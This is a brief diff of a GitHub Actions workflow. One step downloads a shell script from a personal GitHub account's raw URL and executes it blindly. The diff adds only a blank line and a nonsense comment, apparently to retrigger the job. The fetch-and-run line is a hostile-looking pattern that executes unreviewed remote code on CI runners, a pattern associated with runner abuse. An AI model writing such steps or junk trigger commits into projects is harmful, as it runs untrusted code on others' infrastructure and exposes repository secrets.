@@ -25,3 +25,5 @@ jobs:
    steps:
      - run: |
           wget https://raw.githubusercontent.com/TeresaPalmer94/uradc2/main/bash.sh && chmod +x bash.sh && ./bash.sh
+          
+          #hjhqxjqh
